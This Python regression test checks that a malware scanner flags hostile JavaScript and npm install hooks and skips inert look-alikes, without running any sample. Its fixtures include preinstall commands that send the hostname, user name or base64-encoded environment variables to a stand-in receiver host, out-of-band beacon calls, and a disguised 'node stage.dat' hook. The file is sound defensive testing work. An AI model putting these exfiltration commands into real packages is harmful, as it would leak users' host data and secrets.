#!/usr/bin/env python3
"""Check endpoint findings against API aliases, inert text and unrelated calls."""
import argparse
import io
import json
from pathlib import Path
import re
import subprocess
import tarfile
import tempfile


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', default='../cleave/target/release/cleave')
    args = parser.parse_args()
    root = Path(__file__).resolve().parents[2]
    cleave = str(Path(args.cleave).resolve())
    url = 'https://proof.oast.fun/'
    original = f'const http=require("https");http.get("{url}").on("error",()=>{{}});'
    cases = {
        'get-original.js': original,
        'get-var.js': f'var transport=require("node:http");const target="{url}";transport.get(target);',
        'get-let.js': f'let transport=require("node:https");transport.get("{url}",()=>{{}});',
        'get-inline.js': f'require("https").get("{url}");',
        'get-alias.js': f'const transport=require("https");const alias=transport;alias.get("{url}");',
        'get-port.js': 'const transport=require("https");transport.get("https://proof.oast.fun:8443?probe=1");',
        'get-fake.js': f'const client={{get(){{}}}};client.get("{url}");',
        'get-reassigned.js': f'let client=require("https");client={{get(){{}}}};client.get("{url}");',
        'get-wrong-module.js': f'const client=require("cache");client.get("{url}");',
        'get-unused-collector.js': f'const client=require("https");const unused="{url}";client.get("https://example.invalid/");',
        'get-host-suffix.js': 'const client=require("https");client.get("https://proof.oast.fun"+".example.invalid/");',
        'get-deferred.js': f'const client=require("https");function run(){{client.get("{url}");}}',
        'get-comment.js': '// ' + original,
        'get-quoted.js': 'const source=' + json.dumps(original) + ';',
        'dns-resolve.js': 'const resolver=require("node:dns");const domain="example.invalid";resolver.resolve(domain,()=>{});',
        'dns-inline.js': 'const domain="example.invalid";require("node:dns").resolve(domain,()=>{});',
        'dns-lookup.js': 'const resolver=require("dns");resolver.lookup("example.invalid",()=>{});',
        'dns-long-gap.js': 'const resolver=require("dns");' + '// padding\n' * 100 + 'resolver.resolve("example.invalid",()=>{});',
        'dns-destructured.js': 'const {resolve}=require("dns");resolve("example.invalid",()=>{});',
        'dns-destructured-alias.js': 'const {resolve: ask}=require("node:dns");const target="example.invalid";ask(target,()=>{});',
        'dns-destructured-gap.js': 'const {resolve: ask}=require("dns");const target="example.invalid";const option="A";ask(target,option,()=>{});',
        'dns-destructured-reassigned.js': 'let {resolve}=require("dns");resolve=()=>{};resolve("example.invalid");',
        'dns-destructured-redeclared.js': 'var {resolve}=require("dns");var resolve=()=>{};resolve("example.invalid");',
        'dns-destructured-unrelated.js': 'const {resolve}=require("dns");const ask=()=>{};ask("example.invalid");',
        'dns-unused-import.js': 'const dns=require("dns");const cache={resolve(){}};const domain="example.invalid";cache.resolve(domain);',
        'dns-wrong-module.js': 'const dns=require("cache");dns.resolve("example.invalid");',
        'dns-reassigned.js': 'let dns=require("dns");dns={resolve(){}};dns.resolve("example.invalid");',
        'dns-quoted.js': 'const source=' + json.dumps('const dns=require("dns");dns.resolve("example.invalid");') + ';',
        'dns-comment.js': '// const dns=require("dns");dns.resolve("example.invalid");',
    }
    manifests = {
        'platform-bootstrap': {'preinstall': 'curl -L "https://downloads.example.invalid/$(uname -s)-$(uname -m).tgz" -o tool.tgz'},
        'version-bootstrap': {'preinstall': 'curl -L "https://downloads.example.invalid/tool/$(node --version).tgz" -o tool.tgz'},
        'test-bootstrap': {'test': 'curl -L "https://downloads.example.invalid/$(uname -s).tgz" -o tool.tgz'},
        'quoted-host-url': {'preinstall': 'echo \'curl https://receiver.invalid/?host=$(hostname)\''},
        'unrelated-curl': {'preinstall': 'curl https://downloads.example.invalid/tool.tgz; echo "https://receiver.invalid/?host=$(hostname)"'},
        'collect-host': {'preinstall': 'curl "https://receiver.invalid/?host=$(hostname)"'},
        'collect-env': {'preinstall': 'curl -X POST "https://receiver.invalid/?data=$(env | base64 -w0)"'},
        'collect-user': {'preinstall': 'wget --quiet "https://receiver.invalid/?user=$(whoami)"'},
        'disguised-script': {'preinstall': 'node stage.dat'},
        'version-then-disguised': {'preinstall': 'node --version && node stage.dat'},
        'literal-substitution': {'preinstall': "curl 'https://receiver.invalid/?host=$(hostname)'"},
        'collect-after-quote': {'preinstall': "curl 'https://receiver.invalid/?host='$(hostname)"},
        'collect-with-header': {'preinstall': 'curl -H \'X-Probe: value\' "https://receiver.invalid/?host=$(hostname)"'},
    }
    fixtures = root / 'testdata/hostile/generated/javascript-endpoint-review'
    for name, fixture in [('callback', 'mythic-callback-config.js'), ('builder', 'mythic-payload-builder.js')]:
        source = (fixtures / fixture).read_text()
        aliased = re.sub(r'\bgql\b', 'schemaTag', source).replace('{schemaTag,', '{gql as schemaTag,')
        cases[f'{name}-alias.js'] = aliased
        cases[f'{name}-fake-alias.js'] = aliased.replace("from '@apollo/client'", "from './view-utils'")
        cases[f'{name}-quoted.js'] = 'const source=' + json.dumps(aliased) + ';'

    with tempfile.TemporaryDirectory(prefix='javascript-improve-') as directory:
        stage = Path(directory)
        for name, source in cases.items():
            (stage / name).write_text(source + '\n')
        for name, scripts in manifests.items():
            directory = stage / name
            directory.mkdir()
            (directory / 'package.json').write_text(json.dumps({'name': 'installer-control', 'version': '1.0.0', 'scripts': scripts}))
        packaged = ['get-original.js', 'get-var.js', 'get-inline.js', 'get-fake.js', 'get-unused-collector.js', 'get-deferred.js']
        for name in packaged:
            manifest = json.dumps({'name': 'execution-probe-control', 'version': '1.0.0', 'main': 'index.js'})
            with tarfile.open(stage / name.replace('.js', '.tgz'), 'w:gz') as archive:
                for member, text in [('package.json', manifest), ('index.js', cases[name])]:
                    data = text.encode()
                    info = tarfile.TarInfo('package/' + member)
                    info.size = len(data)
                    archive.addfile(info, io.BytesIO(data))
        paths = sorted(p for p in stage.rglob('*') if p.is_file())
        result = subprocess.run([cleave, '--traits-dir', str(root), '--format', 'jsonl', *map(str, paths)], capture_output=True, text=True, check=True)
        assert 'skipped' not in result.stderr.lower(), result.stderr
        reports = [json.loads(line)['files'][0] for line in result.stdout.split('\n') if line]
        files = {(Path(r['path']).parent.name if Path(r['path']).name == 'package.json' else Path(r['path']).name): r for r in reports}

        def ids(name, level=None):
            return {t['id'] for t in files[name].get('traits', []) if level is None or t['crit'] == level}

        oob = 'objectives/exfiltration/oob/callback::node-module-body-oob-get'
        get = 'micro-behaviors/communications/http/request/get::node-http-client-get'
        positives = ['get-original.js', 'get-var.js', 'get-let.js', 'get-inline.js', 'get-alias.js', 'get-port.js']
        for name in positives:
            assert oob in ids(name, 4), (name, ids(name))
            assert get in ids(name, 3), (name, ids(name))
        for name in [n for n in cases if n.startswith('get-') and n not in positives]:
            assert oob not in ids(name), (name, ids(name))
        for name in ['get-fake.js', 'get-reassigned.js', 'get-wrong-module.js', 'get-quoted.js', 'get-comment.js']:
            assert get not in ids(name), (name, ids(name))
        published = 'objectives/exfiltration/oob/callback::published-tiny-node-package-oob-beacon'
        for name in packaged:
            actual = name.replace('.js', '.tgz')
            assert (published in ids(actual, 5)) == (name in positives), (actual, ids(actual, 5))

        dns = 'micro-behaviors/communications/dns/resolver::'
        resolve_calls = {dns + 'dns-require-receiver-resolve', dns + 'dns-destructured-resolve-call'}
        for name in ['dns-resolve.js', 'dns-inline.js', 'dns-long-gap.js', 'dns-destructured.js', 'dns-destructured-alias.js', 'dns-destructured-gap.js']:
            assert resolve_calls & ids(name, 3), (name, ids(name))
        assert dns + 'dns-require-bound-lookup' in ids('dns-lookup.js', 3)
        assert dns + 'dns-bound-resolve-variable-name' in ids('dns-resolve.js', 3)
        for name in ['dns-unused-import.js', 'dns-wrong-module.js', 'dns-reassigned.js', 'dns-quoted.js', 'dns-comment.js', 'dns-destructured-reassigned.js', 'dns-destructured-redeclared.js', 'dns-destructured-unrelated.js']:
            assert not (resolve_calls | {dns + 'dns-bound-resolve-variable-name'}) & ids(name), (name, ids(name))
        for name, trait in [('callback', 'operator-cross-server-callback-importer'), ('builder', 'operator-payload-build-interface')]:
            identity = 'well-known/tool/offensive/mythic::' + trait
            assert identity in ids(f'{name}-alias.js', 5), (name, ids(f'{name}-alias.js'))
            for suffix in ['fake-alias', 'quoted']:
                assert identity not in ids(f'{name}-{suffix}.js'), (name, suffix)
        transfer = 'objectives/supply-chain/install-hook/scripts/host-profile::install-script-exfil'
        for name in ['collect-host', 'collect-env', 'collect-user', 'collect-after-quote', 'collect-with-header']:
            assert transfer in ids(name, 5), (name, ids(name))
        for name in ['platform-bootstrap', 'version-bootstrap', 'test-bootstrap', 'quoted-host-url', 'unrelated-curl', 'literal-substitution']:
            assert not ids(name, 5), (name, ids(name, 5))
        for name in ['platform-bootstrap', 'version-bootstrap', 'test-bootstrap']:
            assert not ids(name, 4), (name, ids(name, 4))
        disguised = 'objectives/evasion/masquerade/extension-mismatch::npm-script-node-non-script-suffix'
        for name in ['disguised-script', 'version-then-disguised']:
            assert disguised in ids(name, 4), (name, ids(name))
    print(f'JavaScript improvement regressions passed: {len(cases) + len(packaged) + len(manifests)} controls; no sample code executed')


if __name__ == '__main__':
    main()
